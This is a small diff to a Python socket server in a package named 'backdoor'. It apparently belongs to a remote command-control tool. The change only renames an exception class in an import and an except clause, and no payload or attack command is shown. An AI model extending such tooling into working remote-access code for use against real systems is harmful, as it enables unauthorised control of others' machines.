@@ -3,7 +3,7 @@ import socket
 
 from backdoor.command.converter import InputToCommandConverter
 from backdoor.command.processor import CommandProcessor
-from backdoor.exceptions.core import ApplicationException
+from backdoor.exceptions.core import PresentableApplicationException
 from backdoor.files.io import FileReader, FileWriter
 from backdoor.messages.exchange.server import ServerExchangeMapper
 from backdoor.messages.messenger import SocketMessenger
@@ -47,7 +47,7 @@ class Server:
             self.processor.pre_process(command)
             result = self.exchanger.exchange(client, command)
             self.processor.post_process(command, result)
-        except ApplicationException as e:
+        except PresentableApplicationException as e:
             print_error(e)
 
     def __accept_connection(self) -> ClientModel:
